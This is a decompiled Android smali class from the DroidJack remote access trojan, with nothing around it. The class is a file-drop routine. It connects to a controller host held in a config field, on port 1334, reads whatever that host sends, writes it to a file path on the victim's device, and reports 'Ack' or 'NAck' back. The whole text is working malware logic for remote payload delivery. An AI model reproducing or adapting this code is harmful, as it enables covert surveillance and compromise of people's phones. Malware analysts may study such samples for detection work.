.class Lnet/droidjack/server/au;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/am;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/am;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/au;->a:Lnet/droidjack/server/am;

    iput-object p2, p0, Lnet/droidjack/server/au;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 7

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/au;->b:Ljava/lang/String;

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    new-instance v1, Ljava/net/Socket;

    sget-object v2, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v3, 0x536

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    const/16 v4, 0x400

    new-array v4, v4, [B

    :goto_0
    invoke-virtual {v3, v4}, Ljava/io/InputStream;->read([B)I

    move-result v5

    const/4 v6, -0x1

    if-ne v5, v6, :cond_0

    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    :goto_1
    return-object v0

    :cond_0
    const/4 v6, 0x0

    invoke-virtual {v2, v4, v6, v5}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v1, v0

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/au;->a()[B

    move-result-object v0

    return-object v0
.end method
